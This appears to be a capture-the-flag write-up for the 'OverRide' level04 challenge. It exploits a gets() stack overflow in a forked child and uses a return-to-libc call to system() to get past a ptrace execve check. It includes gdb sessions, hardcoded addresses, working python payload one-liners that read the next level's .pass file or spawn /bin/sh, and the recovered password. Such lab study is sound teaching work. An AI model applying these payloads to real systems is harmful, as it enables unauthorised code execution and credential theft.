This is the program in normal usage:

```bash
level04@OverRide:~$ ./level04 
Give me some shellcode, k
salut
child is exiting...
```

From ltrace, we can see that an ALARM signal is used after 60 seconds; indeed, when trying to add a lot of characters in the gets function, the program enters into a loop and terminates after 60 seconds due to the SIGALRM signal:

```bash
level04@OverRide:~$ ltrace ./level04 
__libc_start_main(0x80486c8, 1, -10284, 0x8048830, 0x80488a0 <unfinished ...>
signal(14, 0x0804868f)                           = NULL
alarm(60)                                        = 0
fork()                                           = 1634
wait(0xffffd69cGive me some shellcode, k
yo
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... wait resumed> )                             = 1634
puts("child is exiting..."child is exiting...
)                      = 20
+++ exited (status 0) +++
```

A buffer overflow is possible in the child process starting from the gets(&s) function call:

```c
if (pid == 0)
    {
        prctl(1, 1);
        ptrace(PTRACE_TRACEME, 0, 0, 0);
        puts("Give me some shellcode, k");
        gets(&s);
    }
```

At first, we can't trigger the child's segfault by entering commands; this is because GDB only follows the parent process by default:

>By default, when a program forks, GDB will continue to debug the parent process and the child process will run unimpeded.
>If you want to follow the child process instead of the parent process, use the command set follow-fork-mode.

see: https://sourceware.org/gdb/current/onlinedocs/gdb.html/Forks.html

Adding `set follow-fork-mode child` in GDB allows us to finally see the segfault:

```shell
(gdb) set follow-fork-mode child
(gdb) run
Starting program: /home/users/level04/level04 
[New process 1663]
Give me some shellcode, k
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 1663]
0x41414141 in ?? ()
```

So, we have successfully sent our shellcode, but the program controls the use of the execve syscall. By searching a bit on how to bypass this protection, it is possible to execute bash without going through this syscall, but rather by calling the `system()` function from the libc.

The key thing to remember about this technique is that instead of executing the instructions of a shellcode, **we will use the `system()` function present in libc**. This means that when we rewrite EIP, we will not attempt to redirect the program to a buffer but directly to the address of `system()`.

When the RET instruction comes at the end of main (for example), the function will actually perform a POP EIP and JMP EIP. Once we have control of EIP and have redirected the JMP to the `system()` function, it will be necessary to specify the string that will serve as an argument for system() **4 bytes later in the stack** because the 4 bytes between EIP and the argument are the return address of `system()`. These 4 bytes can be overwritten with any value, but we can specify the address of `exit()` in case we want to terminate the program properly (not my case).

Furthermore, the argument will be, as you may guess, the **address of a buffer containing "/bin/sh"**, or any other usefull command.

This technique is often used to bypass NX stack protections, but it can also be used in our case. The observed child process is the one called by our initial fork, so if it makes an execve call, orig_eax will indeed contain the value 11. However, `system()` calls a new child process, which in turn calls execve. The check made by ptrace here: `if (ptrace(PTRACE_PEEKUSER, eax, 44, 0) == 11)` will not apply to this new process.

To perform this attack, we first need to find the address of `system()`:

```bash
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
```

So, we have `system()` at `0xf7e6aed0`.

We can enter the command `/bin/cat /home/users/level05/.pass` inside the input obtained by `gets()`, so that `system()` takes the address of the beginning of the buffer as an argument. To do this, we need to find this address. With gdb, we can follow the child again with `set follow-fork-mode child`, set a breakpoint before the `gets()` call, and check the address that eax has received:

```nasm
   0x0804874b <+131>:	movl   $0x8048903,(%esp)
   0x08048752 <+138>:	call   0x8048500 <puts@plt>
   0x08048757 <+143>:	lea    0x20(%esp),%eax
   0x0804875b <+147>:	mov    %eax,(%esp)
   0x0804875e <+150>:	call   0x80484b0 <gets@plt>
```

We find this address in eax:
```bash
Breakpoint 2, 0x0804875e in main ()
(gdb) x/s $eax
0xffffd5b0:	 ""
```

So, we try to enter this address as an argument for the call to system(), and after a few tries with addresses:
```bash
level04@OverRide:~$ (python -c 'print "/bin/cat /home/users/level05/.pass" + "\x00" + "A" * 121 + "\xd0\xae\xe6\xf7" + "AAAA" + "\xe0\xd5\xff\xff"') | ./level04 
Give me some shellcode, k
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```

We can also try to achieve it with an environment variable, working through address trial and error:

```shell
level04@OverRide:~$ (python -c 'print "A" * 156 + "\xd0\xae\xe6\xf7" + "AAAA" + "\xe8\xd8\xff\xff"') | ./level04 
Give me some shellcode, k
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```

But even simpler, to avoid multiple attempts, the string "/bin/sh" is often present by default in memory during program execution due to its use by certain library functions. You can simply retrieve it by searching in memory from gdb:

```bash
(gdb) b main
Breakpoint 1 at 0x80486cd
(gdb) r
Starting program: /home/users/level04/level04 

Breakpoint 1, 0x080486cd in main ()
(gdb) find __libc_start_main,+99999999,"/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
```

No need to use our own buffers to get the flag with this !
```bash
level04@OverRide:~$ (python -c 'print "A" * 156 + "\xd0\xae\xe6\xf7" + "AAAA" + "\xec\x97\xf8\xf7"'; cat) | ./level04 
Give me some shellcode, k
whoami
level05
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```

### Resources:
- https://beta.hackndo.com/retour-a-la-libc/
- https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc
- https://css.csail.mit.edu/6.858/2019/readings/return-to-libc.pdf
- https://www.exploit-db.com/docs/english/28553-linux-classic-return-to-libc-&-return-to-libc-chaining-tutorial.pdf